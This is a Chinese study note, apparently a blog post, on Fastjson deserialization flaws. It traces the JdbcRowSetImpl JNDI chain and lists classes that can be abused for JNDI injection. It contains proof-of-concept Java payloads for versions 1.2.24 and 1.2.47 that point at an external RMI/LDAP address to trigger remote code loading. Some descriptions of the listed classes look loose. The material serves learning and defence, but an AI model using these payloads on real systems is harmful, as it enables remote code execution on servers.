![](fastjson.jpg)

## 参考文章

https://xz.aliyun.com/news/14309
https://mp.weixin.qq.com/s/t8sjv0Zg8_KMjuW4t-bE-w

FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。Fastjson 是一个 Java 库，提供了Java 对象与 JSON 相互转换

```
<dependency>
<groupId>com.alibaba</groupId>
<artifactId>fastjson</artifactId>
<version>x.x.xx</version>
</dependency>
```


## autoType机制

AutoType 是 Fastjson 的**自动类型识别 / 反序列化类型推断机制**，核心作用是反序列化时，根据 JSON 串中 Fastjson 自动添加的`@type`字段（或手动指定），**自动加载并实例化对应 Java 类**，实现从 JSON 到任意指定 Java 对象的自动转换。

简单说：JSON 里带`@type="com.xxx.XxxClass"`，Fastjson 就会自动找这个类、加载它、创建实例并赋值，无需代码显式指定反序列化的目标类，是提升反序列化便捷性的特性，但也是核心安全风险点 —— 攻击者可通过构造恶意`@type`，让 Fastjson 加载执行恶意类，触发远程代码执行（RCE）

## 应用

1、序列化方法：

JSON.toJSONString()，返回字符串；
JSON.toJSONBytes()，返回byte数组；

2、反序列化方法：

JSON.parseObject()，返回JsonObject；
JSON.parse()，返回Object；
JSON.parseArray(), 返回JSONArray；
将JSON对象转换为java对象：JSON.toJavaObject()；
将JSON对象写入write流：JSON.writeJSONString()；

3、常用：

JSON.toJSONString(),JSON.parse(),JSON.parseObject()

## 引发安全原因

1、序列化固定类后：

parse方法在调用时会调用set方法
parseObject在调用时会调用set和get方法

2、反序列化指定类后：

parseObject在调用时会调用set方法

## 跟踪

1.2.24
```
public class test {  
    public static void main(String[] args) {  
        String payload = "{" +  
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +  
                "\"dataSourceName\":\"rmi://43.143.135.151:50388/b3bcd5\", " +  
                "\"autoCommit\":true" +  
                "}";  
        JSON.parse(payload);  
    }  
}
```

1. 执行setdataSourceName()方法
	```
	 public void setDataSourceName(String var1) throws SQLException {
        if (this.getDataSourceName() != null) {
            if (!this.getDataSourceName().equals(var1)) {
                super.setDataSourceName(var1);
                this.conn = null;
                this.ps = null;
                this.rs = null;
            }
        } else {
            super.setDataSourceName(var1);
        }
    }
	```

2. 执行setAutoCommit()方法
	```
	 public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }

    }
	```

3. 执行connect()
	```
	private Connection connect() throws SQLException {
 if (this.conn != null) {
     return this.conn;
 } else if (this.getDataSourceName() != null) {
     try {
         InitialContext var1 = new InitialContext();
         DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
         return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
     } catch (NamingException var3) {
         throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
     }
 } else {
     return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
        }
 }
	```
4. lookup()方法执行RCE

- 链子
```
setDataSourceName(conn==null)->setAutoCommit->this.connect(dataSourceName=="rmi://43.143.135.151:50388/b3bcd5")->lookup("rmi://43.143.135.151:50388/b3bcd5")
```

1.2.47 增加黑名单绕过机制

poc:

```
public class test {  
    public static void main(String[] args) {  
        String payload = "{\n" +  
                "    \"aaa\": {\n" +  
                "        \"@type\": \"java.lang.Class\",\n" +  
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +  
                "    },\n" +  
                "    \"bbb\": {\n" +  
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +  
                "        \"dataSourceName\": \"ldap://43.143.135.151:50389/5d18c7\n\",\n" +  
                "        \"autoCommit\": true\n" +  
                "    }\n" +  
                "}";  
        JSON.parse(payload);  
    }  
}
```

利用反射的方法绕过

1.2.62

autoType默认关闭，需要开发者开启开关


详细跟链

https://xz.aliyun.com/news/14309

总结：

*1.2.47<=可利用JDK自带链实现RCE
*1.2.47-1.2.80中利用链为依赖包或本地代码
其中依赖包还需要开启autoType,本地代码无需（黑盒不适用）
*1.2.80后续版本目前无


## 引起JNDI注入的类

能触发 JNDI 注入的核心类，均是**JDK 内置 / 常见依赖中支持通过 URL / 名称解析远程资源**的类，Fastjson 开启 AutoType 时，反序列化这些类会被恶意利用，以下是**高频被利用的核心类**（分 JDK 内置、第三方依赖两类，附利用核心点），也是渗透测试和防护的重点：

### 一、JDK 内置核心利用类（最常用，无额外依赖）

1. **`com.sun.rowset.JdbcRowSetImpl`**
    
    最经典的 JNDI 注入利用类，JDK 自带，通过`setDataSourceName`设置远程 RMI/LDAP 地址，触发 lookup 时加载恶意类，**JDK 8u191 前无防护**，是最主流的利用载体。
2. **`javax.naming.InitialContext`**
    
    直接提供 JNDI 的 lookup 方法，反序列化时可直接调用其方法访问远程命名服务，触发注入。
3. **`org.apache.naming.ResourceLinkRef`**（Tomcat 内置，归 JDK 生态）
    
    Tomcat 容器特有的类，支持解析远程 JNDI 资源，常被用于 Tomcat 环境下的 JNDI 注入。
4. **`com.sun.corba.se.impl.jndi.cosnaming.CNCtxFactory`**
    
    JDK CORBA 相关的命名上下文工厂类，可被利用触发远程 JNDI 解析。

### 二、第三方依赖类（需项目引入对应包，实战中高频）

1. **`org.apache.commons.beanutils.BeanComparator`**
    
    结合 JNDI 和反序列化链，通过动态调用触发 JNDI lookup，需引入`commons-beanutils`包。
2. **`org.apache.commons.collections.Transformer`**
    
    Commons Collections 反序列化链的核心类，可嵌套 JNDI 调用，需引入`commons-collections`（3.x 版本高危）。
3. **`com.alibaba.fastjson.util.TypeUtils`**
    
    Fastjson 自身的工具类，被绕过利用时可间接触发类加载和 JNDI 解析